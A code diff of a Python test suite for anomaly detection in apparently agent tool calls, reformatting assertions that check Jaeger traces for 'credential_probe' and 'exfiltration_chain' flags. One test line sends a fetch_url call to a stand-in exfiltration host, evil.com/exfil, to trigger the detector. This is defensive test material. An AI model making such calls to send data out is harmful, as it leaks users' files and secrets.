@@ -85,9 +85,7 @@ class TestAnomalyDetection:
 
         # Check Jaeger for the flag
         harness = TelemetryHarness()
-        spans = await harness.find_spans_with_tag(
-            "anomaly.flags", "credential_probe", timeout=15
-        )
+        spans = await harness.find_spans_with_tag("anomaly.flags", "credential_probe", timeout=15)
         assert len(spans) > 0, "Expected credential_probe flag in Jaeger traces"
 
     async def test_exfiltration_chain_requires_read_then_network(self):
@@ -102,9 +100,7 @@ class TestAnomalyDetection:
             await client.call_tool("fetch_url", {"url": "http://evil.com/exfil"})
 
         harness = TelemetryHarness()
-        spans = await harness.find_spans_with_tag(
-            "anomaly.flags", "exfiltration_chain", timeout=15
-        )
+        spans = await harness.find_spans_with_tag("anomaly.flags", "exfiltration_chain", timeout=15)
         assert len(spans) > 0, "Expected exfiltration_chain flag in Jaeger traces"
 
 
